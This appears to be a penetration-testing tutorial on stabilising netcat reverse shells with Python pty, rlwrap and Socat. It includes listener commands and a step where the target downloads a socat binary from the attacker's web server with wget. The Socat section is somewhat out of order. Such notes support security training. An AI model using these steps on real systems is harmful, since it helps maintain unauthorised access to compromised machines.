
There are many ways to stabilise a netcat shell, we will be looking at 3 of them,  Stabilisation of Windows reverse shells tends to be significantly harder; however, the second technique that we'll be covering here is particularly useful for it:

## 1. Using Python:

First, we use `which python` to know if python exists and in which directory is it, then we run `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required.

Second, we use `export TERM=xterm` which give us access to term commands such as `clear`.

Finally, we use `[CTRL] + [Z]` to move the shell to the background, then we use `stty raw -echo; fg`.
This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.

## 2. using rlwrap:

To use rlwrap, we invoke a slightly different listener by running the following command `rlwrap nc -lvnp <port>`, This technique is particularly useful when dealing with Windows shells, When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell.

## 3. using Socat:

Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell.  A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`

First, transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to the target machine. 

## To change the number of rows and columns in a terminal:

First, open another terminal and run `stty -a`. This will give you a large stream of output. Note down the values for "rows" and "columns":

Next, in your reverse/bind shell, use both of these commands, `stty rows <number>`  and `stty cols <number>`